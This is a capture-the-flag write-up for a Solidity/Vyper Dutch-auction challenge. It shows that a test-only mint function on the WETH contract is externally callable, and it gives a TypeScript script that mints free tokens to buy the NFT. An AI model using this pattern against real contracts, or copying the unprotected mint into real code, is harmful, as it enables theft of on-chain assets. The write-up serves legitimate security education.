## dutch

### description

Dutch auctions are great for NFTs. Can you become the highest bidder?

### solution

In [Deploy.s.sol](../dutch/challenge//project/script/Deploy.s.sol), we could find that the `staringPrice` of the NFT is `1 ether` in `WETH`

```solidity
    args = abi.encode(1 ether, 1 ether / uint256(7 days), art, 0, address(weth));
    IAuction auction = IAuction(deploy("src/", "Auction", args));
```

In [WETH.vy](../dutch//challenge/project/src/WETH.vy), `_mint_for_testing` is an external function. We could call it to mint WETH.

```python
@external
def _mint_for_testing(_target: address, _value: uint256) -> bool:
    self.total_supply += _value
    self.balanceOf[_target] += _value
    log Transfer(empty(address), _target, _value)

    return True
```

And we may find the goal of this challenge in [Challenge.sol](../dutch/challenge/project/src/Challenge.sol).

```solidity
function isSolved() external view returns (bool) {
    return art.balanceOf(address(auction)) == 0;
}
```

It implies that we may simply mint `WETH` token ourselves and buy the NFT directly.

### scripts

```typescript
// pwn.ts
async function main() {
  const signer = await ethers.provider.getSigner();

  const challengeContract = await ethers.getContractAt(
    CHAL_ABI,
    process.env.CHAL_CONTRACT!
  );

  const auctionAddr = await challengeContract.auction();
  const auctionContract = await ethers.getContractAt(AUCTION_ABI, auctionAddr);

  const tokenAddr = await auctionContract.token();
  const tokenContract = await ethers.getContractAt(WETH_ABI, tokenAddr);

  const price = await auctionContract.getPrice();

  const tx = await tokenContract._mint_for_testing(signer.address, price);
  await tx.wait();

  const approveTx = await tokenContract
    .connect(signer)
    .approve(auctionAddr, price);
  await approveTx.wait();

  await auctionContract.connect(signer).buy();
}
```
